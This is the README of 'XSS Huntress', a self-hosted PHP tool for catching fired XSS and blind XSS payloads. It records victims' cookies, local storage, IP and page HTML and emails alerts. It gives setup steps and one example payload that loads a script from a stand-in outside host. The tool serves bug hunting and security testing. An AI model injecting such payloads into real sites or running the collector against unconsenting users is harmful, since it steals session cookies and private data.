<h1 align="center">XSS Huntress</h1>

<h4 align="center">A tool for identifying XSS and Blind XSS bugs in websites.</h4>

<p align="center">
    <img src="https://img.shields.io/badge/php-%3E=7-blue" alt="php badge">
    <img src="https://img.shields.io/badge/license-MIT-green" alt="MIT license badge">
</p>

---

## Features

- web interface
- sends an email notification whenever a payload is fired
- data collected by client that fired payload: 
    - Time
    - URL
    - Referrer
    - IP
    - User Agent
    - Cookies
    - Local Storage
    - HTML of page that fired payload.
- reports stored in `sqlite` database


## Installation

1. Clone the repository:

```bash
git clone https://github.com/sfttw/xsshuntress.git
```

2. Navigate to the project directory:

```bash
cd xsshuntress
```

3. Install PHPMailer:

```bash
composer require phpmailer/phpmailer
```

4. Update the paths to the PHPMailer classes in `collect.php`:

```php
require 'path/to/PHPMailer/src/Exception.php';
require 'path/to/PHPMailer/src/PHPMailer.php';
require 'path/to/PHPMailer/src/SMTP.php';
```

5. Update the SMTP server settings and email addresses in `collect.php`:

```php
$mail->Host = 'smtp.example.com'; // Specify main and backup SMTP servers
$mail->Username = 'user@example.com'; // SMTP username
$mail->Password = 'secret'; // SMTP password
$mail->setFrom('from@example.com', 'Mailer');
$mail->addAddress('joe@example.net', 'Joe User'); // Add a recipient
```

6. Update nginx IP restriction to admin interface

```
location ^~ /admin {
allow 127.0.0.1; #EDIT IN YOUR IP ADDRESS 
deny all;
```
## Injection

As soon as the script is available online, you can use your favorite XSS payload:
```
<script src=http://x.example.com></script>
```

---

<img src="https://raw.githubusercontent.com/sfttw/xsshuntress/main/screenshot.png" />

---

## Configure domain

Using nginx, you can easily configure a vhost like this:

```
server {
        listen 80;
        listen [::]:80;

        server_name example.com;

        root /var/www/example.com;
        index collect.js;

        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.3-fpm.sock;
        }

        location ^~ /admin {
        allow 1.1.1.1; #EDIT IN YOUR IP ADDRESS 
        index display.php;
        deny all;

        # This will inherit the allow/deny from the outer location
        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.3-fpm.sock;
                }
        }

    listen [::]:443 ssl; # managed by Certbot
    listen 443 ssl; # managed by Certbot
    ssl_certificate /etc/letsencrypt/live/example.com/fullchain.pem; # managed by Certbot
    ssl_certificate_key /etc/letsencrypt/live/example.com/privkey.pem; # managed by Certbot

}
```

## Notes

1. The `collect.php` file collects the data from the client and stores it in the SQLite database. It also sends an email notification whenever a new entry is added to the database.

2. The `collect.js` file collects the data from the client and sends it to the server.

3. The `display.php` file displays the data stored in the SQLite database.


## To Do

- Improve web interface.
  
## Contributing

Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.

## License

[MIT](https://choosealicense.com/licenses/mit/)

Feel free to [open an issue](/../../issues/) if you have any problem with the script.  

